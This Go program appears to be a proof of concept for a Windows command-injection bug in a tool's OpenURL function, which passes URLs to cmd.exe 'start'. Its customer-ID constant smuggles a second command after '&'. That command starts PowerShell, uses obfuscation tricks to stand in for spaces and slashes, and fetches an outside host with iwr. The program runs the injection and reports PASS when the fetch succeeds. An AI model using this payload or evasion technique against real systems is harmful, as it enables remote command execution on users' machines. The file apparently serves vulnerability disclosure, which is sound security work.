// Command repro_windows_openurl reproduces the v0.1.2 Windows OpenURL sink
// with a customer ID that is actually stored in RevenueCat (created via the
// public SDK v1 subscribers endpoint). Current main uses ShellExecuteW;
// this talks to cmd.exe the way v0.1.2 did.
//
// The ID has no `/` or spaces (API + Go quoting constraints). After `&`,
// PowerShell builds http:// with [char]47 and GETs alfon.net. No secrets.
package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Stored original_app_user_id from GET /v1/subscribers (HTTP 201).
const customerID = "rcbb_6aad59cf&powershell%ProgramFiles:~10,1%-c%ProgramFiles:~10,1%iwr('http:'+[char]47+[char]47+'alfon.net?g6aad59cf')"

func main() {
	if runtime.GOOS != "windows" {
		fmt.Fprintln(os.Stderr, "windows only")
		os.Exit(2)
	}

	url := "https://app.revenuecat.com/projects/x/customers/" + customerID
	fmt.Printf("customer_id=%s\n", customerID)
	fmt.Printf("lookup=http://alfon.net?g6aad59cf\n")
	fmt.Printf("url=%s\n", url)
	fmt.Printf("::notice::alfon.net query g6aad59cf\n")

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	var buf bytes.Buffer
	cmd := exec.CommandContext(ctx, "cmd", "/c", "start", "", url)
	cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
	cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "cmd.Run: %v\n", err)
	}

	out := buf.String()
	if !strings.Contains(out, "alfon.net") && !strings.Contains(out, "<!DOCTYPE html>") {
		fmt.Fprintln(os.Stderr, "FAIL: stored customer ID did not fetch alfon.net via iwr")
		fmt.Fprintf(os.Stderr, "captured (%d bytes): %q\n", len(out), trim(out, 512))
		os.Exit(1)
	}
	fmt.Println("PASS: stored customer ID executed on the Windows runner and fetched alfon.net")
}

func trim(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
